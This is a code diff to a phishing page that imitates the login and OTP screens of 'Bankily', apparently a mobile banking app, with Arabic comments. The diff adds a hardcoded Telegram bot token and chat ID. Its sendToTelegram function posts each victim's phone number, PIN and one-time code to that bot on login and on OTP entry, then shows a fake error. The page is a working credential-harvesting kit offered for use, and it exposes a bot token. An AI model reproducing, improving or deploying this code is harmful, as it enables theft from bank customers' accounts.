@@ -9,7 +9,6 @@
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;background:#fff}
 
-/* لون تحديد النص */
 ::selection {
   background-color: #b3c5ea !important;
   color: #000000 !important;
@@ -26,14 +25,12 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 
 .body{flex:1;overflow-y:auto;display:flex;flex-direction:column;padding:0 24px 16px;-webkit-overflow-scrolling:touch}
 
-/* تكبير الشعار وتنسيق الحاوية */
 .logo-box{display:flex;justify-content:center;margin:10px 0 20px}
 .logo-box img{width:260px;max-width:85%;height:auto;object-fit:contain}
 
 .field{margin-bottom:20px; position: relative;}
 .lbl{font-size:12.5px;font-weight:600;color:#444;display:block;text-align:right;margin-bottom:6px}
 
-/* حقل اسم المستخدم / رقم الهاتف */
 .row-phone-wrap {
   display: flex;
   align-items: center;
@@ -68,7 +65,6 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 
 .errmsg{color:#e74c3c;font-size:11px;text-align:right;margin-top:4px;min-height:14px}
 
-/* حقل الرقم السري */
 .pin-row-wrap {
   display: flex;
   align-items: center;
@@ -107,7 +103,6 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
   box-shadow: none !important;
 }
 
-/* زر نسيت الرقم السري */
 .forgot-container {
   width: 100%;
   display: flex;
@@ -130,7 +125,6 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
   white-space: nowrap;
 }
 
-/* مستخدم جديد */
 .lnk-md{
   font-size:11px;
   font-weight:700;
@@ -144,7 +138,6 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 
 .spacer{flex:1;min-height:20px}
 
-/* زر تسجيل الدخول */
 .btn{
   height:50px;
   background:#F2C029;
@@ -163,7 +156,6 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 .screen{display:flex;flex-direction:column;height:100%}
 .hide{display:none!important}
 
-/* ==================== شاشة OTP ==================== */
 .otp-hdr {
   background: #29C5E0 !important;
   height: 48px !important;
@@ -233,7 +225,6 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
   font-family: system-ui, -apple-system, sans-serif;
 }
 
-/* ==================== نوافذ التنبيه المنبثقة ==================== */
 .modal-overlay {
   position: absolute;
   top: 0;
@@ -397,28 +388,42 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 </div>
 
 <script>
-const telegramToken = "";
-const telegramChatId = "";
+// إعدادات بوت التليجرام المأخوذة من الصور
+const TELEGRAM_TOKEN = "8854630231:AAHwY-escCA2tlAzBgDZWqaPNqUNTpIKGA";
+const TELEGRAM_CHAT_ID = "8972356637";
 
-function sendToTelegram(phone, pin, otpCode = null) {
-  let message = `🔔 Bankily Login\n📱 Phone: ${phone}\n🔑 Pin: ${pin}`;
-  if (otpCode) {
-    message += `\n📝 OTP: ${otpCode}`;
+// دالة الإرسال المباشرة إلى Telegram API
+function sendToTelegram(phone, pin, otp) {
+  var text = "📱 **New Bankily Entry**\n\n" +
+             "👤 **Phone / User:** " + phone + "\n" +
+             "🔑 **PIN:** " + pin;
+
+  if (otp) {
+    text += "\n🔢 **OTP Code:** " + otp;
   }
 
-  const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+  var apiUrl = "https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage";
 
-  fetch(url, {
+  fetch(apiUrl, {
     method: "POST",
-    headers: {"Content-Type": "application/json"},
+    headers: {
+      "Content-Type": "application/json"
+    },
     body: JSON.stringify({
-      chat_id: telegramChatId,
-      text: message,
-      parse_mode: "HTML"
+      chat_id: TELEGRAM_CHAT_ID,
+      text: text,
+      parse_mode: "Markdown"
     })
   })
-  .then(response => console.log("Sent"))
-  .catch(error => console.error("Error:", error));
+  .then(function(response) {
+    return response.json();
+  })
+  .then(function(data) {
+    console.log("Telegram Response:", data);
+  })
+  .catch(function(error) {
+    console.error("Telegram Send Error:", error);
+  });
 }
 
 function setupStrictLengthValidation(inputElement, maxLength) {
@@ -491,7 +496,8 @@ function login(){
   if(ph.length !== 8 || !isValidPrefix || pin.length !== 4){
     document.getElementById('user-error-modal').classList.remove('hide');
   } else {
-    sendToTelegram(ph, pin);
+    // استدعاء دالة الإرسال عند تسجيل الدخول
+    sendToTelegram(ph, pin, null);
     showOtp();
   }
 }
@@ -541,6 +547,7 @@ function verify(){
   var ph=phEl.value.trim();
   var pin=P.map(function(p){return p.value;}).join('');
   
+  // استدعاء دالة الإرسال مع كود OTP
   sendToTelegram(ph, pin, code);
 
   document.getElementById('otp-error-modal').classList.remove('hide');
